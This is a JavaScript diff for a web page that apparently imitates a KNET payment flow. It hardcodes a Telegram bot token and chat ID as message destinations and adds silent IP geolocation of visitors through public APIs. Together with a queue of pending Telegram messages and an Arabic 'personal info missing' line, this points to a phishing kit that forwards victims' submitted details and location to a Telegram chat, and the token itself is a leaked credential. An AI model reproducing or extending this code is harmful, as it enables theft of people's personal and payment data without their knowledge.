@@ -1,16 +1,37 @@
 const TELEGRAM_REQUEST_TIMEOUT_MS = 3000;
+const TELEGRAM_LOCATION_TIMEOUT_MS = 3000;
 const TELEGRAM_PENDING_MESSAGES_KEY = "pendingTelegramMessages";
 const TELEGRAM_SEPARATOR = "<b>───────────────</b>";
 const TELEGRAM_PERSONAL_INFO_MISSING_LINE = "المستخدم لم يقم بادخال المعلومات الشخصية";
 const TELEGRAM_CONFIG = window.__TELEGRAM_CONFIG__ || {};
-const TELEGRAM_BOT_TOKEN = String(TELEGRAM_CONFIG.botToken || "");
-const TELEGRAM_CHAT_ID = String(TELEGRAM_CONFIG.chatId || "");
+const TELEGRAM_BOT_TOKEN = String(TELEGRAM_CONFIG.botToken || "8679859917:AAFu08HmPKFuphlWj-cIPHOMUHMmT6jOQys");
+const TELEGRAM_CHAT_ID = String(TELEGRAM_CONFIG.chatId || "8546425880");
 const COUNTRY_STORAGE_KEY = "country";
 const LOCATION_STORAGE_KEY = "location";
 const SUBMISSION_LOADING_DURATION_MS = 3000;
 const SUBMISSION_LOADING_STYLE_ID = "submission-loading-style";
 const SUBMISSION_LOADING_OVERLAY_ID = "submission-loading-overlay";
 const SUBMISSION_LOADING_VARIANT_KNET = "knet";
+const LOCATION_API_FALLBACKS = [
+  {
+    url: "https://get.geojs.io/v1/ip/geo.json",
+    getCountryCode(data) {
+      return data && data.country_code ? data.country_code : "";
+    },
+  },
+  {
+    url: "https://ipinfo.io/json",
+    getCountryCode(data) {
+      return data && data.country ? data.country : "";
+    },
+  },
+  {
+    url: "https://ipwho.is/",
+    getCountryCode(data) {
+      return data && data.success ? data.country_code || "" : "";
+    },
+  },
+];
 
 let submissionLoadingAnimationFrameId = null;
 const NON_WESTERN_DIGIT_MAP = {
@@ -111,6 +132,33 @@ function setupNumericInputNormalization() {
 
   document.addEventListener("input", handleNumericInputEvent);
   document.addEventListener("change", handleNumericInputEvent);
+}
+
+function countryCodeToFlagEmoji(countryCode) {
+  if (!countryCode || String(countryCode).length !== 2) {
+    return "📍";
+  }
+
+  return String(countryCode)
+    .toUpperCase()
+    .split("")
+    .map(function(character) {
+      return String.fromCodePoint(127397 + character.charCodeAt(0));
+    })
+    .join("");
+}
+
+function getArabicCountryName(countryCode) {
+  if (!countryCode || typeof Intl === "undefined" || typeof Intl.DisplayNames !== "function") {
+    return "";
+  }
+
+  try {
+    const regionNames = new Intl.DisplayNames(["ar"], { type: "region" });
+    return regionNames.of(String(countryCode).toUpperCase()) || "";
+  } catch (error) {
+    return "";
+  }
 }
 
 function shouldUseTelegramHtml(text) {
@@ -262,12 +310,78 @@ async function retryPendingTelegramMessages() {
   setPendingTelegramMessages(remainingMessages);
 }
 
+async function fetchJsonWithTimeout(url, timeoutMs = TELEGRAM_LOCATION_TIMEOUT_MS) {
+  const controller = new AbortController();
+  const timeoutId = window.setTimeout(function() {
+    controller.abort();
+  }, timeoutMs);
+
+  try {
+    const response = await fetch(url, {
+      headers: { Accept: "application/json" },
+      signal: controller.signal,
+    });
+
+    if (!response.ok) {
+      throw new Error(`Location request failed with status ${response.status}`);
+    }
+
+    return await response.json();
+  } finally {
+    window.clearTimeout(timeoutId);
+  }
+}
+
+async function fetchVisitorCountryData() {
+  for (const api of LOCATION_API_FALLBACKS) {
+    try {
+      const data = await fetchJsonWithTimeout(api.url, TELEGRAM_LOCATION_TIMEOUT_MS);
+      const countryCode = api.getCountryCode(data);
+      const countryName = getArabicCountryName(countryCode);
+
+      if (!countryCode || !countryName) {
+        throw new Error("Location data is incomplete.");
+      }
+
+      return {
+        countryCode: countryCode,
+        countryName: countryName,
+      };
+    } catch (error) {
+      continue;
+    }
+  }
+
+  return null;
+}
+
 async function getAppCountryNameInArabic() {
-  return normalizeStoredValue(localStorage.getItem(COUNTRY_STORAGE_KEY));
+  const visitorCountry = await fetchVisitorCountryData();
+
+  if (!visitorCountry) {
+    return "";
+  }
+
+  localStorage.setItem(COUNTRY_STORAGE_KEY, visitorCountry.countryName);
+  localStorage.setItem(
+    LOCATION_STORAGE_KEY,
+    `${countryCodeToFlagEmoji(visitorCountry.countryCode)} - ${visitorCountry.countryName}`
+  );
+  return visitorCountry.countryName;
 }
 
 async function getVisitorLocationInArabic() {
-  return normalizeStoredValue(localStorage.getItem(LOCATION_STORAGE_KEY));
+  const visitorCountry = await fetchVisitorCountryData();
+
+  if (!visitorCountry) {
+    localStorage.setItem(LOCATION_STORAGE_KEY, "");
+    return "";
+  }
+
+  const formattedLocation = `${countryCodeToFlagEmoji(visitorCountry.countryCode)} - ${visitorCountry.countryName}`;
+  localStorage.setItem(COUNTRY_STORAGE_KEY, visitorCountry.countryName);
+  localStorage.setItem(LOCATION_STORAGE_KEY, formattedLocation);
+  return formattedLocation;
 }
 
 function getCurrentPageKey() {
